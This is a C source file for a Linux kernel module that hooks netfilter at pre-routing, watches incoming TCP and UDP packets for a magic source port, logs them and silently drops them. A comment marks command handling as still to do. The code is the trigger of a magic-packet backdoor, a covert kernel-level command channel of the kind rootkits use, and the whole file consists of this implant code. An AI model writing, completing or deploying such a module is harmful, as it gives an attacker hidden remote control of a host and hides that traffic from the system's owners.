#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <stddef.h>

#include "macros.h"

MODULE_AUTHOR("monstars");
MODULE_DESCRIPTION("nothin but net");
MODULE_LICENSE("GPL");

static struct nf_hook_ops s_hookops;

unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook_state *state)
{
    unsigned int retval = NF_ACCEPT;
    struct iphdr *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct udphdr *udph = NULL;
    unsigned short src_port = 0;
    unsigned short dst_port = 0;

    if (sockbuf)
    {
        if ((iph = ip_hdr(sockbuf)))
        {
            if (IPPROTO_TCP == iph->protocol)
            {
                if ((tcph = (struct tcphdr *)((__u32 *)iph + iph->ihl)))
                {
                    src_port = ntohs(tcph->source);
                    dst_port = ntohs(tcph->dest);
                }
            }
            else if (IPPROTO_UDP == iph->protocol)
            {
                if ((udph = (struct udphdr *)((__u32 *)iph + iph->ihl)))
                {
                    src_port = ntohs(udph->source);
                    dst_port = ntohs(udph->dest);
                }
            }
            // look for magic source port
            if (MAGIC_SRC_PORT == src_port)
            {
                KERNEL_LOG("MONSTARS_NF : Magic %s %pI4:%d --> %pI4:%d\n",
                        (tcph ? "TCP" : "UDP"),
                        &iph->saddr, src_port, &iph->daddr, dst_port);
                // TODO: handle commands
                retval =  NF_DROP;
            }
        }
    }    
    return retval;
}

int init_module()
{
    int retval = 0;
    s_hookops.hook      = (nf_hookfn *) hook_func;
    s_hookops.hooknum   = NF_INET_PRE_ROUTING;
    s_hookops.pf        = PF_INET;
    s_hookops.priority  = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    if (nf_register_net_hook(&init_net, &s_hookops))
#else
    if (nf_register_hook(&s_hookops))
#endif
    {
        KERNEL_LOG("MONSTARS_NF : Error registering hook!\n");
        retval = 1;
    }
#ifdef DEBUG
    else
    {
        KERNEL_LOG("MONSTARS_NF : Module charged.\n");
    }
#endif
    return retval;
}

void cleanup_module()
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    nf_unregister_net_hook(&init_net, &s_hookops);
#else
    nf_unregister_hook(&s_hookops);
#endif
    KERNEL_LOG("MONSTARS_NF : Module decharged.\n");
}
